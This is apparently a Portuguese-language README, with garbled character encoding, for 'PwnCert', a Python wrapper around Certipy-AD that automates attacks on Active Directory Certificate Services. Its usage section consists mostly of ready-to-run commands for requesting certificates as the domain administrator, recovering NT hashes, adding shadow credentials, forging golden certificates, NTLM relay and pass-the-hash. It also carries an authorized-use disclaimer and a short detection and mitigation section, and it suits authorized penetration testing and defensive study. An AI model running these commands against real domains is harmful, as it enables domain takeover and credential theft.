# PwnCert ğŸ”

<div align="center">

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                                                               â•‘
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
â•‘   â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
â•‘   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•   â–ˆâ–ˆâ•‘   
â•‘   â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   
â•‘   â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
â•‘   â•šâ•â•      â•šâ•â•â•â•šâ•â•â• â•šâ•â•  â•šâ•â•â•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•   â•šâ•â•   
â•‘                                                               â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

**Active Directory Certificate Services Exploitation Automation**

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Powered by](https://img.shields.io/badge/powered%20by-Certipy--AD-red.svg)](https://github.com/ly4k/Certipy)

</div>

---

## ğŸ“– DescriÃ§Ã£o

**PwnCert** Ã© uma ferramenta de automaÃ§Ã£o Python projetada para simplificar e agilizar a exploraÃ§Ã£o de vulnerabilidades em **Active Directory Certificate Services (AD CS)**. ConstruÃ­da como um wrapper inteligente do [Certipy-AD](https://github.com/ly4k/Certipy), a PwnCert oferece uma interface de linha de comando amigÃ¡vel e workflows automatizados para profissionais de seguranÃ§a ofensiva.

### ğŸ¯ Por que PwnCert?

- **AutomaÃ§Ã£o Completa**: Execute mÃºltiplos comandos Certipy-AD em workflows automatizados
- **Interface Simplificada**: CLI intuitiva com subcomandos organizados
- **Suporte Total ESC1-ESC16**: Cobertura completa de todas as tÃ©cnicas de exploraÃ§Ã£o AD CS conhecidas
- **Workflows Inteligentes**: Automatize processos complexos de enumeraÃ§Ã£o atÃ© privilÃ©gio escalado
- **Flexibilidade**: Suporta mÃºltiplos mÃ©todos de autenticaÃ§Ã£o (senha, NTLM hashes)

---

## âœ¨ Funcionalidades

- ğŸ” **EnumeraÃ§Ã£o**: Descubra CAs, templates vulnerÃ¡veis e configuraÃ§Ãµes incorretas
- ğŸ« **RequisiÃ§Ã£o de Certificados**: Explore ESC1, ESC2, ESC3 e outras tÃ©cnicas
- ğŸ” **AutenticaÃ§Ã£o**: Use certificados para obter TGTs e hashes NT
- ğŸ‘¤ **Shadow Credentials**: Ataque de persistÃªncia via Key Trust
- ğŸ† **Golden Certificates**: Forge certificados com privilÃ©gios de CA
- ğŸ”„ **NTLM Relay**: Relay para endpoints AD CS HTTP/RPC
- ğŸ“œ **ManipulaÃ§Ã£o de Certificados**: Export, import e conversÃ£o de formatos
- âš¡ **Workflow Automatizado**: ExecuÃ§Ã£o completa do processo de exploraÃ§Ã£o

---

## ğŸš€ InstalaÃ§Ã£o

### Requisitos

- Python 3.7+
- pip
- Certipy-AD

### InstalaÃ§Ã£o RÃ¡pida

```bash
# Clone o repositÃ³rio
git clone https://github.com/yourusername/pwncert.git
cd pwncert

# Instale o Certipy-AD
pip install certipy-ad

# Torne o script executÃ¡vel
chmod +x pwncert.py

# Execute
python pwncert.py -h
```

### InstalaÃ§Ã£o via pip (Opcional)

```bash
pip install -r requirements.txt
```

---

## ğŸ“š Uso

### Sintaxe BÃ¡sica

```bash
python pwncert.py [GLOBAL_OPTIONS] <COMMAND> [COMMAND_OPTIONS]
```

### OpÃ§Ãµes Globais

```
-u, --username      Username para autenticaÃ§Ã£o
-p, --password      Password para autenticaÃ§Ã£o
-H, --hashes        NTLM hashes (formato LM:NT)
-d, --domain        Domain name
--dc-ip             IP do Domain Controller
--debug             Modo debug (verbose)
```

---

## ğŸ’¡ Exemplos de Uso

### 1. EnumeraÃ§Ã£o de Templates VulnerÃ¡veis

```bash
# Enumerar todos os templates vulnerÃ¡veis e habilitados
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' find --vulnerable --enabled

# Salvar resultado em JSON
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' find -v -e --json -o results
```

### 2. ExploraÃ§Ã£o ESC1 - Requisitar Certificado com UPN Alternativo

```bash
# Requisitar certificado especificando UPN alternativo
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  req -ca 'CORP-DC-CA' -t 'VulnerableTemplate' -a 'administrator@corp.local'
```

### 3. AutenticaÃ§Ã£o com Certificado

```bash
# Autenticar usando certificado obtido e recuperar hash NT
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  auth --pfx administrator.pfx

# Gerar ticket Kerberos (formato .kirbi)
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  auth --pfx administrator.pfx --kirbi
```

### 4. Shadow Credentials Attack

```bash
# Adicionar Shadow Credential em conta alvo
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  shadow -a 'targetuser' --action add

# Listar Shadow Credentials existentes
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  shadow -a 'targetuser' --action list
```

### 5. Golden Certificate (Forge)

```bash
# Forjar certificado como Domain Admin
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  forge --ca-pfx ca.pfx --upn 'administrator@corp.local' -o forged
```

### 6. NTLM Relay para AD CS

```bash
# Iniciar relay para endpoint AD CS
python pwncert.py -u 'user' -p 'Password123' -d 'corp.local' \
  relay -ca 'CORP-DC-CA' -t 'User' --target 'http://ca.corp.local'
```

### 7. Workflow Automatizado Completo

```bash
# Executar workflow completo de exploraÃ§Ã£o
python pwncert.py -u 'admin' -p 'Password123' -d 'corp.local' \
  workflow --target administrator -o ./results
```

### 8. Usando NTLM Hashes

```bash
# AutenticaÃ§Ã£o com Pass-the-Hash
python pwncert.py -u 'admin' \
  -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' \
  -d 'corp.local' find --vulnerable
```

---

## ğŸ”§ Comandos DisponÃ­veis

| Comando | DescriÃ§Ã£o |
|---------|-----------|
| `find` | Enumerar CAs, templates e identificar vulnerabilidades |
| `req` | Requisitar certificado de template vulnerÃ¡vel |
| `auth` | Autenticar usando certificado PFX |
| `shadow` | Executar Shadow Credentials attack |
| `forge` | Forjar certificado (Golden Certificate) |
| `relay` | Relay NTLM para AD CS endpoints |
| `cert` | Manipular certificados (export/import/convert) |
| `workflow` | Workflow automatizado completo |

---

## ğŸ“ TÃ©cnicas de ExploraÃ§Ã£o Suportadas

PwnCert suporta todas as tÃ©cnicas ESC (Escalation) conhecidas:

- **ESC1**: Misconfigured Certificate Templates
- **ESC2**: Misconfigured Certificate Templates (Any Purpose)
- **ESC3**: Enrollment Agent Templates
- **ESC4**: Vulnerable Certificate Template Access Control
- **ESC5**: Vulnerable PKI Object Access Control
- **ESC6**: EDITF_ATTRIBUTESUBJECTALTNAME2
- **ESC7**: Vulnerable Certificate Authority Access Control
- **ESC8**: NTLM Relay to AD CS HTTP Endpoints
- **ESC9-ESC16**: TÃ©cnicas avanÃ§adas de exploraÃ§Ã£o

Para mais detalhes sobre cada tÃ©cnica, consulte o [Certipy Wiki](https://github.com/ly4k/Certipy/wiki).

---

## ğŸ“ Estrutura de SaÃ­da

Quando vocÃª executa comandos com output, PwnCert organiza os resultados:

```
results/
â”œâ”€â”€ enumeration.json          # Resultados da enumeraÃ§Ã£o
â”œâ”€â”€ enumeration.txt           # Resultados em texto
â”œâ”€â”€ administrator.pfx         # Certificados obtidos
â”œâ”€â”€ administrator.key         # Chaves privadas
â””â”€â”€ administrator_hash.txt    # Hashes NT recuperados
```

---

## âš ï¸ Avisos Importantes

### Uso Ã‰tico e Legal

**PwnCert Ã© uma ferramenta para uso em ambientes autorizados apenas.**

- âœ… Use em ambientes de teste/lab prÃ³prios
- âœ… Use em pentests com autorizaÃ§Ã£o explÃ­cita por escrito
- âœ… Use para pesquisa de seguranÃ§a Ã©tica
- âŒ **NUNCA** use em sistemas sem autorizaÃ§Ã£o
- âŒ Uso nÃ£o autorizado pode ser **ILEGAL** e resultar em consequÃªncias criminais

### Responsabilidade

O autor nÃ£o se responsabiliza por uso indevido desta ferramenta. O usuÃ¡rio Ã© totalmente responsÃ¡vel por garantir que possui autorizaÃ§Ã£o adequada antes de executar qualquer teste de seguranÃ§a.

---

## ğŸ›¡ï¸ DetecÃ§Ã£o e Defesa

### Detectando ExploraÃ§Ã£o AD CS

- Monitor de eventos do Windows (Event IDs: 4886, 4887, 4888)
- AnÃ¡lise de requisiÃ§Ãµes de certificados anÃ´malas
- Auditoria de templates com configuraÃ§Ãµes perigosas
- ImplementaÃ§Ã£o de PKINIT monitoring

### MitigaÃ§Ãµes

1. **Remover direitos de enrollment**: Limitar quem pode requisitar certificados
2. **Manager approval**: Exigir aprovaÃ§Ã£o manual para templates sensÃ­veis
3. **Remover SANs perigosos**: Desabilitar Subject Alternative Names em templates
4. **Auditar regularmente**: Usar `certipy find` para identificar misconfigurations
5. **Implementar EPA**: Extended Protection for Authentication

Para guia completo de hardening, veja: [AD CS Hardening Guide](https://github.com/ly4k/Certipy/wiki/10-%E2%80%90-Hardening)

---

## ğŸ¤ Contribuindo

ContribuiÃ§Ãµes sÃ£o bem-vindas! Para contribuir:

1. Fork o projeto
2. Crie uma branch para sua feature (`git checkout -b feature/AmazingFeature`)
3. Commit suas mudanÃ§as (`git commit -m 'Add some AmazingFeature'`)
4. Push para a branch (`git push origin feature/AmazingFeature`)
5. Abra um Pull Request

---

## ğŸ“ Roadmap

- [ ] Suporte a mÃºltiplos domÃ­nios em um Ãºnico workflow
- [ ] Modo de detecÃ§Ã£o (blue team)
- [ ] RelatÃ³rios HTML interativos
- [ ] IntegraÃ§Ã£o com outras ferramentas (Impacket, BloodHound)
- [ ] GUI opcional
- [ ] Export para formatos de pentest (Markdown, PDF)

---

## ğŸ™ CrÃ©ditos

- **Certipy-AD**: [@ly4k](https://github.com/ly4k) - Ferramenta base excepcional
- **SpecterOps**: Research original sobre AD CS attacks
- **Will Schroeder & Lee Christensen**: Pesquisa fundamental sobre AD CS

---

## ğŸ“„ LicenÃ§a

Este projeto estÃ¡ licenciado sob a licenÃ§a MIT - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## ğŸ“ Contato

- **Issues**: [GitHub Issues](https://github.com/yourusername/pwncert/issues)
- **DiscussÃµes**: [GitHub Discussions](https://github.com/yourusername/pwncert/discussions)

---

## â­ Apoie o Projeto

Se o PwnCert foi Ãºtil para vocÃª, considere:

- â­ Dar uma estrela no repositÃ³rio
- ğŸ› Reportar bugs e sugerir melhorias
- ğŸ“¢ Compartilhar com a comunidade de seguranÃ§a
- ğŸ¤ Contribuir com cÃ³digo

---

<div align="center">

**Feito com â¤ï¸ para a comunidade de Offensive Security**

*Use responsavelmente. Hack the planet (legally)!* ğŸŒğŸ”“

</div>